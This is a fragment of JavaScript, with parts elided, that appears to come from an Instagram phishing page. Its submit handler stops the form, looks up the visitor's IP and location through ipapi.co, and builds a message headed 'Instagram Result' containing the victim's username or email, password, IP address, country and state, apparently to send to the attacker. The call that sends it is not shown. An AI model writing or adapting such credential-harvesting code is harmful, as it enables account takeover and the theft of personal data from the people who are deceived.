  ...
  e.preventDefault();
    ...
    fetch("https://ipapi.co/json/")
      ...
      .then((data) => {
        ...
        var my_text = `Instagram Result from user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
